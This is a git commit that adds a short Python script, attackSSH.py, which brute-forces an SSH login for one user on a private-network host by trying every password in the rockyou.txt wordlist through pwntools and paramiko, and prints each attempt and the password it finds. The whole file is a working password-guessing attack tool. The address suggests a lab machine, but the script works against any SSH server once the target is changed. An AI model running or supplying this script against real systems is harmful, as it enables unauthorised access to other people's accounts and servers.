2e96ca3752baff960639b595bb16a7e29c738ac2
CryptoRabb1t <71525504+LaiRui003@users.noreply.github.com>
2022-04-17 19:48:20 +0200

    Add files via upload

---
+++ attackSSH.py
@@ -0,0 +1,28 @@
+from pwn import *
+import paramiko
+
+
+def exploit():
+	intentos = 0
+	target = "192.168.186.128"
+	user = "rabb1t"
+
+	with open ("rockyou.txt", "r") as password_list:
+		for password in password_list:
+			password = password.strip("\n")
+			try:
+				print ("[{}] Intentando con: '{}'".format(intentos,password))
+				ssh_connect = ssh(host=target,user=user,password=password,timeout=1)
+				if ssh_connect.connected():
+					print("[+] El password es: '{}'".format(password))
+					ssh_connect.close()
+					break
+				ssh_connect.close()
+			except paramiko.ssh_exception.AuthenticationException:
+				print("[-] No es correcta")
+			intentos += 1 
+
+
+
+if __name__=="__main__":
+	exploit()
